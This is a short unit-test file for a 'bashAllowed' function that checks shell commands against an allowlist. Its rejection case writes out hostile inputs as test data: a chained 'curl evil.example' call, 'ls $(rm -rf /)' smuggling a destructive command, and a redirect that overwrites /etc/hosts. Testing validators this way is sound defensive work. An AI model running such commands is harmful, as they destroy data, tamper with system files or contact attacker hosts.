import { bashAllowed } from "./runs";

const allow = ["npm run", "npm test", "git status", "git add", "git commit", "ls", "node "];

describe("bashAllowed", () => {
  it("allows allowlisted commands and chains of them", () => {
    expect(bashAllowed("npm run typecheck", allow)).toBe(true);
    expect(bashAllowed("git add -A && git commit -m 'x'", allow)).toBe(true);
    expect(bashAllowed("ls", allow)).toBe(true);
    expect(bashAllowed("npm test 2>&1", allow)).toBe(true);
  });
  it("rejects anything else, including smuggled commands", () => {
    expect(bashAllowed("git push origin main", allow)).toBe(false);
    expect(bashAllowed("npm run build && curl evil.example", allow)).toBe(false);
    expect(bashAllowed("ls $(rm -rf /)", allow)).toBe(false);
    expect(bashAllowed("node -e 1 > /etc/hosts", allow)).toBe(false);
    expect(bashAllowed("lsof", allow)).toBe(false);
    expect(bashAllowed("", allow)).toBe(false);
  });
});
